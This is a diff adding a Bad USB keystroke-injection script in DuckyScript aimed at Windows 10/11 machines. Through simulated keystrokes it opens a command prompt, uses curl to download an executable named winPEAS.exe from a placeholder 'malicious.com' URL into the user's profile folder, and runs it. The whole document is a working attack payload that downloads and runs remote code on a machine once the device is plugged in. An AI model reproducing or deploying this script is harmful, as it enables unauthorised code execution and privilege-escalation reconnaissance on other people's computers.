@@ -1,0 +1,28 @@
+REM Title: Bad USB - winPEAS payload delivered by curl
+REM Author: DannnyzZ
+REM Date: 10.15.2023
+REM Description: Opens commandline, then curls payload from github repository
+REM Target: Windows 10/11 (cmd)
+REM Version: 1.0
+
+REM Pause for everything to recognize and be ready
+DELAY 2000
+
+REM Open Command Line
+CTRL ESC
+DELAY 750
+STRING cmd
+DELAY 250
+ENTER
+DELAY 1000
+ENTER
+
+REM Execute curl payload from link
+@echo off
+REM Input command
+STRING @echo off && set "downloadURL=https://www.malicious.com/winPEAS.exe" && set "downloadPath=%USERPROFILE%\winPEAS.exe" && set "runCommand=%USERPROFILE%\winPEAS.exe"
+ENTER
+DELAY 750
+STRING curl -LJO "%downloadURL%" && move "winPEAS.exe" "%downloadPath%" && start "" "%runCommand%"
+ENTER
+
